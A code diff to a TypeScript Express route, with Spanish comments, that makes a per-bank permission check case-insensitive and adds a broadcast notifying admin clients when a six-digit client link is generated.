@@ -571,14 +571,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Verificar que el usuario tenga acceso al banco seleccionado
       if (user.role !== 'admin' && user.allowedBanks !== 'all') {
-        const allowedBanks = (user.allowedBanks as string)?.split(',') || [];
-        const requestedBank = (banco as string).toUpperCase();
+        // Convertir a mayúsculas para hacer la comparación insensible a mayúsculas/minúsculas
+        const allowedBanksArray = user.allowedBanks?.split(',').map(bank => bank.trim().toUpperCase()) || [];
+        const requestedBank = (banco as string).trim().toUpperCase();
         
         // Comprobar si el banco solicitado está en la lista de permitidos
-        if (!allowedBanks.some((b: string) => b.toUpperCase() === requestedBank)) {
+        if (!allowedBanksArray.includes(requestedBank)) {
           return res.status(403).json({ 
             message: "No tienes permiso para generar enlaces para este banco",
-            allowedBanks
+            allowedBanks: allowedBanksArray
           });
         }
       }
@@ -615,7 +616,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${link}`);
-      console.log(`Generado por usuario: ${user.username}, Permisos de bancos: ${(user.allowedBanks as string) || 'all'}`);
+      console.log(`Generado por usuario: ${user.username}, Permisos de bancos: ${user.allowedBanks || 'all'}`);
+
+      // Notificar a los clientes de admin sobre el nuevo enlace
+      broadcastToAdmins(JSON.stringify({
+        type: 'LINK_GENERATED',
+        data: { 
+          sessionId,
+          code: sixDigitCode,
+          banco: banco as string,
+          userName: user.username
+        }
+      }));
 
       res.json({ 
         sessionId, 
